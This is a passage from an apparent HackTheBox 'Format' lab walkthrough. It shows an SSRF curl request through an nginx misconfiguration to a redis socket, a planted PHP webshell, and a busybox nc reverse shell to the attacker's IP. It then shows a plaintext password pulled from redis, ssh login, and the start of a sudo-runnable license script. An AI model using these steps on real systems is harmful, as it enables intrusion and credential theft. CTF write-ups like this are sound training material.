+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;first-name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;last-name&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-zA-Z\-]+$/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;first-name&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;first-name&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="s2">&#34;Invalid first name&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="nx">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">HSET</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span> <span class="s2">&#34;username&#34;</span><span class="p">,</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">HSET</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span> <span class="s2">&#34;password&#34;</span><span class="p">,</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">HSET</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span> <span class="s2">&#34;first-name&#34;</span><span class="p">,</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;first-name&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">HSET</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span> <span class="s2">&#34;last-name&#34;</span><span class="p">,</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;last-name&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$redis</span><span class="o">-&gt;</span><span class="na">HSET</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]),</span> <span class="s2">&#34;pro&#34;</span><span class="p">,</span> <span class="s2">&#34;false&#34;</span><span class="p">);</span> <span class="c1">//not ready yet, license keys coming soon
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /dashboard?message=Registration successful!&amp;status=success&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking at the nmap port scan, we don&rsquo;t see an open port that might be related to redis. So we cannot bypass the registration page and communicate with redis directly, or can we?</p>
+<h2 id="foothold">Foothold
+</h2><h3 id="ssrf-to-redis-database-via-nginx-misconfiguration">SSRF to redis database via nginx misconfiguration
+</h3><p><a class="link" href="https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/"  target="_blank" rel="noopener"
+    >This article</a> covers how we might abuse poor configuration in nginx&rsquo;s proxy_pass settings, allowing us to send commands directly to the redis socket.</p>
+<p>referring to the source code, we see new account information is set with the <code>HSET</code> request type, as opposed to the article&rsquo;s MSET. After making the <code>asdf</code> account like normal, we can hopefully change the <code>pro</code> key to &ldquo;True&rdquo; by sending another request. For this, I chose to craft a <code>curl</code> request. Note that the redis socket location is replicated from the <code>isPro</code> function shown earlier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Format</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="s2">&#34;HSET&#34;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="k">static</span><span class="o">/</span><span class="n">unix</span><span class="p">:</span><span class="o">%</span><span class="mi">2</span><span class="n">fvar</span><span class="o">%</span><span class="mi">2</span><span class="n">frun</span><span class="o">%</span><span class="mi">2</span><span class="n">fredis</span><span class="o">%</span><span class="mi">2</span><span class="n">fredis</span><span class="o">.</span><span class="n">sock</span><span class="p">:</span><span class="o">%</span><span class="mi">22</span><span class="n">asdf</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">20</span><span class="n">pro</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">22</span><span class="bp">true</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">jquery</span><span class="o">.</span><span class="n">js</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="mi">502</span> <span class="n">Bad</span> <span class="n">Gateway</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">center</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mi">502</span> <span class="n">Bad</span> <span class="n">Gateway</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">center</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">hr</span><span class="o">&gt;&lt;</span><span class="n">center</span><span class="o">&gt;</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">center</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Despite the error, we can see that we have become a pro user with our new star badge:</p>
+<p><img src="/p/hackthebox-format/Images/pro.png"
+	width="463"
+	height="78"
+	srcset="/p/hackthebox-format/Images/pro_hu4401079345360801394.png 480w, /p/hackthebox-format/Images/pro_hu16842096078337421379.png 1024w"
+	loading="lazy"
+	
+		alt="The pro star shows that our exploit works"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="593"
+		data-flex-basis="1424px"
+	
+></p>
+<h3 id="arbitrary-file-write-to-create-a-webshell">Arbitrary File Write to create a webshell
+</h3><p>Next, writing a basic php webshell into uploads/rev.php:</p>
+<p><img src="/p/hackthebox-format/Images/burp1.png"
+	width="1013"
+	height="434"
+	srcset="/p/hackthebox-format/Images/burp1_hu5616768715020788372.png 480w, /p/hackthebox-format/Images/burp1_hu5811065979693011091.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="560px"
+	
+></p>
+<p>Verifying webshell upload:</p>
+<p><img src="/p/hackthebox-format/Images/id.png"
+	width="648"
+	height="137"
+	srcset="/p/hackthebox-format/Images/id_hu13253828458126970795.png 480w, /p/hackthebox-format/Images/id_hu15395612033701268100.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="472"
+		data-flex-basis="1135px"
+	
+></p>
+<p>Since the blog pages are reset frequently, it is best to transition to a reverse shell. A simple payload using <code>busybox</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">testa</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">rev</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">busybox</span><span class="o">%</span><span class="mi">20</span><span class="n">nc</span><span class="o">%</span><span class="mf">2010.10</span><span class="o">.</span><span class="mf">14.8</span><span class="o">%</span><span class="mi">208888</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">e</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>and on our listener, we now have a reverse connection:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Format]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8888                       
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.8] from (UNKNOWN) [10.10.11.213] 58190
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="lateral-movement">Lateral Movement
+</h2><h3 id="enumerating-redis-database">Enumerating redis database
+</h3><p>Reviewing the user <code>cooper</code>&rsquo;s home directory, we see a <code>rediscli_history</code>. Although unreadable, it is notable that redis is being used by more than just the web server. We can attach to the redis socket ourselves to enumerate:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">format</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">redis</span><span class="o">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When enumerating redis keys, we see a couple entries for cooper, a user on the system. Note if we reached this place faster, we could also see an entry for our <code>asdf</code> user. However, account entries are reset quickly for a cleaner box experience.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">redis</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">KEYS</span> <span class="s1">&#39;*&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="p">)</span> <span class="s2">&#34;cooper.dooper:sites&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="p">)</span> <span class="s2">&#34;cooper.dooper&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After reviewing <a class="link" href="https://stackoverflow.com/questions/8078018/get-redis-keys-and-values-at-command-prompt"  target="_blank" rel="noopener"
+    >This stack overflow post</a>, I find that i can retrieve key contents by matching the type. Finding type:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">redis</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">type</span> <span class="s2">&#34;cooper.dooper:sites&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">list</span>
+</span></span><span class="line"><span class="cl"><span class="n">redis</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">type</span> <span class="s2">&#34;cooper.dooper&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">hash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Hash is more interesting, as it is likely related to passwords. Each type requires a different command to print:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">redis</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">hgetall</span> <span class="s2">&#34;cooper.dooper&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">1</span><span class="p">)</span> <span class="s2">&#34;username&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">2</span><span class="p">)</span> <span class="s2">&#34;cooper.dooper&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">3</span><span class="p">)</span> <span class="s2">&#34;password&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;zooperdoopercooper&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">5</span><span class="p">)</span> <span class="s2">&#34;first-name&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">6</span><span class="p">)</span> <span class="s2">&#34;Cooper&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">7</span><span class="p">)</span> <span class="s2">&#34;last-name&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">8</span><span class="p">)</span> <span class="s2">&#34;Dooper&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">9</span><span class="p">)</span> <span class="s2">&#34;pro&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10</span><span class="p">)</span> <span class="s2">&#34;false&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The hash is indeed the interesting entry, and more surprisingly the password is not hashed at all! We can try to use this to authenticate as <code>cooper</code> using ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Format]
+</span></span><span class="line"><span class="cl">└─$ ssh cooper@microblog.htb
+</span></span><span class="line"><span class="cl">cooper@microblog.htb&#39;s password:
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">cooper@format:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="abusing-python-string-format">Abusing Python String format()
+</h3><p>Checking sudo privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cooper@format:~$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for cooper: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries for cooper on format:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User cooper may run the following commands on format:
+</span></span><span class="line"><span class="cl">    (root) /usr/bin/license
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This binary is custom built for this box:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cooper@format:~$ /usr/bin/license
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Microblog license key manager can only be run as root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon further inspection, it is not a binary, but instead a python script. This means we can read the contents.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cooper@format:~$ file /usr/bin/license 
+</span></span><span class="line"><span class="cl">/usr/bin/license: Python script, ASCII text executable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Full code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">redis</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">license</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Microblog license key manager can only be run as root&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Microblog license key manager&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--provision&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Provision license key for specified user&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--deprovision&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Deprovision license key for specified user&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
